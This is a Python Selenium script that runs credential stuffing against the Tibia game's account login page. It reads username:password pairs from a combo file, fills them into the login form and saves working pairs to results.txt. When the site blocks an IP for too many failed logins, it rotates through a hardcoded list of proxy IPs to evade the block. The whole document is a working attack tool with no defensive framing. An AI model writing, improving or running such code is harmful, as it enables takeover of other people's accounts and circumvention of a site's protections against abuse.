from selenium import webdriver
from selenium.webdriver.common.by import By
from selenium.webdriver.support.ui import WebDriverWait
from selenium.webdriver.support import expected_conditions as EC
from selenium.common.exceptions import TimeoutException


proxyId = -1
isProxy = False
browser = None
cookie = None
timeout = 120

#proxy list
proxy=["91.203.5.175:443",
"88.199.82.111:47887",
"156.67.113.198:39496",
"185.149.201.138:41258",
"185.188.116.223:54406",
"91.192.228.92:46285"
    "91.203.5.175:443",
"31.184.252.69:443",
"62.77.152.192:80",]

#default proxy
PROXY = "91.203.5.175:443"
chrome_options = webdriver.ChromeOptions()
chrome_options.add_argument('--proxy-server=%s' % PROXY)

class Credential:
  def __init__(self, username, password):
    self.username = username
    self.password = password

def saveCredntialResultToFile(credential,fileName):
    f=open(fileName, "a+")
    f.write(credential.username + ":" + credential.password)
    f.close()

#getProxyFrom proxylist
def getProxy():
    global proxyId,proxy
    lenght = len(proxy)
    if lenght >  proxyId :
        return proxy[proxyId]
    raise ValueError('The Proxy limit was reached , stoped program')


def getCredentialsFromFile():
    credentials = []
    f=open("TIBIA-MIX.txt", "r")
    f1 = f.readlines()
    for line in f1:
        result = line.split(':')
        username = result[0]
        password = result[1]
        crednetial = Credential(username,password)
        credentials.append(crednetial)
    f.close()
    return credentials





credentials = getCredentialsFromFile()

def goWithProxy(credential):
    global proxyId,isProxy,cookie,timeout
    isProxy = True
    proxyId = proxyId + 1 
    proxy = getProxy()
    print("Going with proxy:"+proxy)
    chrome_options = webdriver.ChromeOptions()
    chrome_options.add_argument('--proxy-server=%s' % proxy)
    browser = webdriver.Chrome(options=chrome_options)
    browser.set_page_load_timeout(timeout)
    usernameStr = credential.username
    passwordStr = credential.password
    try:
        browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
    except TimeoutException:
        print("Timeout exception")
        browser.quit()
        goWithProxy(credential)
    
    username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
    username.send_keys(usernameStr)
    password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
    password.send_keys(passwordStr)

    WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, 'ButtonText')))
    #signInButton.click()

    try:        
        errorMessage = errorMessage = browser.find_element_by_class_name('ErrorMessage')
        errorText = errorMessage.text
        print("Trying  to login with following credentials")
        print(credential.username + ":"  + credential.password) 
        print(errorText)
        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
        if ipBlockText in errorText:
            print("Block ip error")
            goWithProxy(credential)
    except:
        print('Error Message not found')

    if browser != None:
        cookie = browser.get_cookie('SecureSessionID')

    #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

    if cookie != None:
        print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
        saveCredntialResultToFile(credential,"results.txt") 
    if browser !=  None:
        browser.quit()

for credential in credentials:
    if(isProxy):
        PROXY = getProxy()
        chrome_options = webdriver.ChromeOptions()
        chrome_options.add_argument('--proxy-server=%s' % PROXY)
        browser = webdriver.Chrome(options=chrome_options)
    else:
        browser = webdriver.Chrome()

    browser.set_page_load_timeout(timeout)
    usernameStr = credential.username
    passwordStr = credential.password
    
    try:
        browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))
    except TimeoutException:
        print('Timeout  exception')
        browser.quit()
        goWithProxy(credential)
       
    
    username = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginname')))
    username.send_keys(usernameStr)
    password = WebDriverWait(browser, 10).until(EC.presence_of_element_located((By.NAME, 'loginpassword')))
    password.send_keys(passwordStr)
    current_url = browser.current_url
    
    signInButton = WebDriverWait(browser, 10).until(EC.element_to_be_clickable((By.CLASS_NAME, 'ButtonText')))
    
    current_url = browser.current_url
    
    #signInButton.click()
    try:        
        errorMessage = browser.find_element_by_class_name('ErrorMessage')
        errorText = errorMessage.text
        print("Trying to login with following credentials")
        print(credential.username + ":"  + credential.password) 
        print(errorText)
        ipBlockText = "Wrong account data has been entered from your IP address too often. You are unable to log in from this IP address for the next 30 minutes. Please wait."
        if ipBlockText in errorText:
            print("Block ip error")
            browser.quit()
            browser = None
            goWithProxy(credential)
    except:
       print("Error message not found")
    if browser != None:
        cookie = browser.get_cookie('SecureSessionID')

    #browser.get(('https://www.tibia.com/account/?subtopic=accountmanagement'))

    if cookie != None:
        print("Cookie found, logged succesfuly with credentials:" + credential.username + ":" + credential.password)
        saveCredntialResultToFile(credential,"results.txt") 
    if browser !=  None:
        browser.quit()